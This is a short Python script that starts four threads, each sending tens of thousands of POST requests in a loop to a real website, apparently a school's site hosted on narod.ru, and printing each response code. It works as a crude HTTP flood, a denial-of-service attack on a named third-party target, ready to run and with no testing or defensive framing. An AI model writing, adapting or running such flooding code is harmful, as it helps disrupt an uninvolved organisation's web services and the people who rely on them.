import threading
import time
import requests
import random
def heavy(n, i, thead):
    for x in range(1, n):
        q = requests.post(r'https://ryazshkola-70.narod.ru/')
        print(q.status_code)


def sequential(calc, thead):
    for i in range(calc):
        heavy(2500, i, thead)


def threaded(theads, calc):
    threads = []
    for thead in range(theads):
        t = threading.Thread(target=sequential, args=(calc, thead))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()


if __name__ == "__main__":
    threaded(4, 20)